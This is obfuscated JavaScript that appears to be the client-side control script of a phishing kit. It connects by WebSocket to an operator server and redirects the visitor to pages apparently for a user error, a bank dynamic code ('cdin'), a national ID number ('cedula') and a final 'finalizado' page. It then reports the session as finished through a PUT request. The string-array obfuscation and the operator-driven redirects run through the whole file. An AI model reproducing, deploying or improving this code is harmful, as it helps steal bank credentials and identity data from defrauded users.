const _0xe485be = _0x2b7e;
function _0x2b7e(_0x442610, _0x1b5675) {
  const _0x4079b3 = _0x4079();
  return (
    (_0x2b7e = function (_0x2b7ecf, _0x237935) {
      _0x2b7ecf = _0x2b7ecf - 0x193;
      let _0x3f3262 = _0x4079b3[_0x2b7ecf];
      return _0x3f3262;
    }),
    _0x2b7e(_0x442610, _0x1b5675)
  );
}
(function (_0x2954fe, _0x38fa69) {
  const _0x176b80 = _0x2b7e,
    _0x18caaf = _0x2954fe();
  while (!![]) {
    try {
      const _0x2febe2 =
        parseInt(_0x176b80(0x1b7)) / 0x1 +
        parseInt(_0x176b80(0x1a6)) / 0x2 +
        (parseInt(_0x176b80(0x1b6)) / 0x3) *
          (-parseInt(_0x176b80(0x19c)) / 0x4) +
        parseInt(_0x176b80(0x1b9)) / 0x5 +
        parseInt(_0x176b80(0x1ab)) / 0x6 +
        (parseInt(_0x176b80(0x197)) / 0x7) *
          (parseInt(_0x176b80(0x1bd)) / 0x8) +
        (-parseInt(_0x176b80(0x1a4)) / 0x9) *
          (parseInt(_0x176b80(0x19d)) / 0xa);
      if (_0x2febe2 === _0x38fa69) break;
      else _0x18caaf["push"](_0x18caaf["shift"]());
    } catch (_0x16353e) {
      _0x18caaf["push"](_0x18caaf["shift"]());
    }
  }
})(_0x4079, 0x23a11);
const dataLogId = localStorage[_0xe485be(0x194)]("dataLogId"),
  token = localStorage[_0xe485be(0x194)](_0xe485be(0x1b1));
function _0x4079() {
  const _0x356aff = [
    "application/json",
    "Error\x20al\x20actualizar\x20el\x20estado:",
    "7MJEpSA",
    "Estado\x20actualizado\x20correctamente\x20en\x20el\x20servidor.",
    "setItem",
    "log",
    "valid",
    "718948SXHOnl",
    "63830pCvgOA",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "origin",
    "Conectado\x20al\x20WebSocket",
    "message",
    "href",
    "Bearer\x20",
    "603oCwCwU",
    "./cdin.error.html",
    "322808egBbdl",
    "valor",
    "./error.user.html",
    "Finalizado",
    "Error\x20de\x20conexión:",
    "453084HQHbhF",
    "personas",
    "error",
    "Hubo\x20un\x20error\x20al\x20cargar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "connect_error",
    "location",
    "dataLogToken",
    "json",
    "PUT",
    "./cdin.html",
    "connect",
    "3nRuozK",
    "269157eIeKaD",
    "stringify",
    "398950TALKQe",
    "./error.cedula.html",
    "Hubo\x20un\x20error\x20al\x20actualizar\x20el\x20estado.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "/dataLogs/updateEndDataLog/",
    "1339760pKpbtB",
    "./error.html",
    "Datos\x20recibidos:",
    "checkerInfo",
    "getItem",
  ];
  _0x4079 = function () {
    return _0x356aff;
  };
  return _0x4079();
}
(!dataLogId || !token) &&
  (console[_0xe485be(0x1ad)](_0xe485be(0x19e)),
  alert(_0xe485be(0x1ae)),
  (window[_0xe485be(0x1b0)][_0xe485be(0x1a2)] = _0xe485be(0x1be)));
const socket = io(url, { query: { token: token } });
socket["on"](_0xe485be(0x1b5), () => console["log"](_0xe485be(0x1a0))),
  socket["on"](_0xe485be(0x1af), (_0x18ea38) =>
    console["error"](_0xe485be(0x1aa), _0x18ea38[_0xe485be(0x1a1)])
  ),
  socket["on"]("data", async (_0xfd48f7) => {
    const _0x4a1358 = _0xe485be;
    console[_0x4a1358(0x19a)](_0x4a1358(0x1bf), _0xfd48f7),
      console[_0x4a1358(0x19a)]("ID\x20de\x20dataLog:", dataLogId);
    if (String(_0xfd48f7[_0x4a1358(0x19b)]) !== String(dataLogId)) return;
    const _0x4f2cb = {
      us:
        info[_0x4a1358(0x193)]["mode"] === _0x4a1358(0x1ac)
          ? _0x4a1358(0x1a8)
          : _0x4a1358(0x1ba),
      din: _0x4a1358(0x1b4),
      new_din: _0x4a1358(0x1a5),
      end: "./finalizado.html",
    };
    if (_0xfd48f7[_0x4a1358(0x1a7)] in _0x4f2cb) {
      _0xfd48f7[_0x4a1358(0x1a7)] === "us" &&
        localStorage[_0x4a1358(0x199)]("errorTrico", "error");
      if (_0xfd48f7[_0x4a1358(0x1a7)] === "end")
        try {
          await updateStatus();
        } catch (_0x173f92) {
          console[_0x4a1358(0x1ad)](_0x4a1358(0x196), _0x173f92),
            alert(_0x4a1358(0x1bb));
          return;
        }
      window[_0x4a1358(0x1b0)][_0x4a1358(0x1a2)] = _0x4f2cb[_0xfd48f7["valor"]];
    }
  });
async function updateStatus() {
  const _0x46fb15 = _0xe485be;
  try {
    const _0x7a5a5f = await fetch(url + _0x46fb15(0x1bc) + dataLogId, {
      method: _0x46fb15(0x1b3),
      headers: {
        "Content-Type": _0x46fb15(0x195),
        Authorization: _0x46fb15(0x1a3) + token,
        Origin: window["location"][_0x46fb15(0x19f)],
      },
      body: JSON[_0x46fb15(0x1b8)]({ status: _0x46fb15(0x1a9) }),
    });
    if (!_0x7a5a5f["ok"]) {
      const _0x89346a = await _0x7a5a5f[_0x46fb15(0x1b2)]();
      throw new Error(
        _0x89346a[_0x46fb15(0x1ad)] ||
          "Error\x20en\x20el\x20PUT\x20a\x20updateEndDataLog"
      );
    }
    console["log"](_0x46fb15(0x198));
  } catch (_0x23cc36) {
    throw _0x23cc36;
  }
}
